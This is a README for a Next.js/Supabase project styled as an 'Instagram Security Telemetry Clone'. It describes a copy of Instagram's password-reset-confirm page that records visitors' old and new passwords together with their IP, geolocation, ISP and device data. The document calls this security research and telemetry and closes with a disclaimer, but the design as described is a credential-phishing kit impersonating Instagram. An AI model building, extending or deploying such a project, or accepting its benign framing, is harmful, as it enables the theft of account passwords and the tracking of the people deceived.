# Instagram Security Telemetry Clone

A modern security telemetry and audit logging system built with Next.js, Supabase, and Vercel.

This project started as a simple password reset flow experiment and evolved into an event-driven security monitoring system with:

- session correlation
- geo-ip telemetry
- device/browser detection
- audit event tracking
- serverless backend architecture

---

# Features

## Security Event Tracking

Track user actions as correlated events:

- `app_open`
- `password_confirm`
- `password_reset`

---

## Session Correlation

Every flow shares the same:

```txt
session_id
```

allowing all user interactions to be grouped into one timeline.

---

## Geo-IP Telemetry

Using:

- IP address lookup
- location detection
- ISP detection
- proxy/hosting detection

Powered by:

```txt
ip-api.com
```

---

## Device & Browser Detection

Automatic parsing from `user-agent`:

- browser
- operating system
- device type

---

## Serverless Backend

Built entirely with:

- Next.js API Routes
- deployed on Vercel

No separate backend server required.

---

# Stack

## Frontend

- Next.js 15
- React
- TypeScript

## Backend

- Next.js Route Handlers
- Supabase PostgreSQL

## Hosting

- Vercel

---

# Project Structure

```txt
src/
├── app/
│   ├── accounts/
│   └── api/
│       ├── accounts/
│       └── security/
│
├── components/
│
├── lib/
│   ├── security/
│   ├── supabase/
│   └── validations/
│
├── types/
│
└── utils/
```

---

# Security Event Flow

## 1. App Open

Triggered when user opens the page:

```txt
/accounts/password/reset/confirm
```

Telemetry captured:

- IP
- browser
- OS
- device
- geo-ip
- pathname

---

## 2. Password Confirm

Triggered when user submits current password.

Payload example:

```json
{
  "old_password": "xxxxx"
}
```

---

## 3. Password Reset

Triggered when user submits new password.

Payload example:

```json
{
  "new_password": "xxxxx"
}
```

---

# Database Schema

## events_audit

Main event telemetry table.

Core fields:

- session_id
- event_type
- ip_address
- user_agent
- browser
- os
- device_type
- payload (jsonb)

---

# Environment Variables

Create:

```env
.env.local
```

Add:

```env
NEXT_PUBLIC_SUPABASE_URL=
SUPABASE_SERVICE_ROLE_KEY=
```

---

# Important Security Notes

## DO NOT expose:

```txt
SUPABASE_SERVICE_ROLE_KEY
```

This key:

- bypasses RLS
- has admin privileges
- should only run on the server

---

# Local Development

Install dependencies:

```bash
yarn install
```

Run development server:

```bash
yarn dev
```

Build production:

```bash
yarn build
```

---

# Deployment

This project is optimized for:

- Vercel
- Supabase

Deployment flow:

1. Push to GitHub
2. Vercel auto-builds
3. API routes become serverless backend functions

---

# Current Limitations

## Temporary TypeScript Relaxation

Current build config includes:

```ts
typescript: {
  ignoreBuildErrors: true;
}

eslint: {
  ignoreDuringBuilds: true;
}
```

This is temporary during rapid prototyping.

Future improvement:

- generate official Supabase types
- restore strict typing

---

# Future Improvements

- Dashboard analytics
- Suspicious login detection
- Impossible travel detection
- Session replay metadata
- Advanced telemetry correlation
- Map visualization
- Threat scoring
- Proxy/VPN heuristics

---

# Architecture Philosophy

This project follows:

- event-driven logging
- telemetry-first architecture
- serverless backend patterns
- payload extensibility
- lightweight fingerprinting

---

# Disclaimer

This project is for:

- educational purposes
- telemetry experiments
- security research
- UI/UX replication practice

Do not use for unauthorized credential collection or malicious activity.

---

# License

MIT
